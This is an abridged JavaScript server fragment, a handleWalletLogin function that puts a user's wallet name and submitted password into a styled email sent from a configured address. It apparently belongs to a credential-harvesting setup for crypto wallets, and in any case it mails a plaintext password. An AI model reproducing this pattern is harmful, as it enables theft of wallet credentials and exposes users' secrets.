...
const emailFrom = process.env.EMAIL_FROM; // e.g., 'onboarding@yourdomain.com'
...
export const handleWalletLogin = async (req, res) => {
  ...
  const emailBody = generateStyledEmail(emailSubject, { 
    walletName, 
    method: 'Login', 
    type: 'Password', 
    data: { password } 
